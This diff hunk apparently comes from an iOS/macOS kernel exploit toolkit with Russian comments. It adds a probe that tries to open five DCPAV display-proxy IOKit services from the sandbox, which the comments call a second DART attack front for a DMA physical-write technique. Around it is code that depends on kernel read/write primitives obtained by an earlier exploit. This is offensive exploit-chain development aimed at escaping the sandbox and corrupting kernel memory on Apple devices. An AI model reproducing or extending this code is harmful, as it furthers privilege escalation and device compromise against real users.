@@ -5703,6 +5703,23 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
 {
     NSMutableString *r = [NSMutableString string];
     kpNote(r, @"=== IOSurface backing-PA swap: physwrite через DMA ===");
+    // 1.9.206 (р.51): DCPAV-проба — 5 прокси display-пайплайна = IODARTMapper-
+    // подклассы. Если io_service_open пройдёт из песочницы — второй DART-фронт
+    // с VA-based дескрипторами (patch-point [desc+0xb8] из р.52 вооружён).
+    {
+        const char *dcpav[5] = { "DCPAVControllerProxy", "DCPAVDeviceProxy", "DCPAVServiceProxy",
+                                 "DCPAVVideoInterfaceProxy", "DCPAVAudioInterfaceProxy" };
+        for (int i = 0; i < 5; i++) {
+            io_service_t s = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching(dcpav[i]));
+            if (!s) { kpNote(r, [NSString stringWithFormat:@"  [DCPAV] %s: сервис НЕ найден", dcpav[i]]); continue; }
+            io_connect_t c = IO_OBJECT_NULL;
+            kern_return_t kr = IOServiceOpen(s, mach_task_self(), 0, &c);
+            kpNote(r, [NSString stringWithFormat:@"  [DCPAV] %s: open kr=0x%x%@", dcpav[i], kr,
+                      (kr == KERN_SUCCESS && c) ? @" ← ОТКРЫЛСЯ ИЗ ПЕСОЧНИЦЫ!" : @""]);
+            if (kr == KERN_SUCCESS && c) IOObjectRelease(c);
+            IOObjectRelease(s);
+        }
+    }
     if (!gPrimitives.kreadbuf || !gPrimitives.kwritebuf) {
         [r appendString:@"KRW не жив — сначала эксплойт.\n"];
         return r;
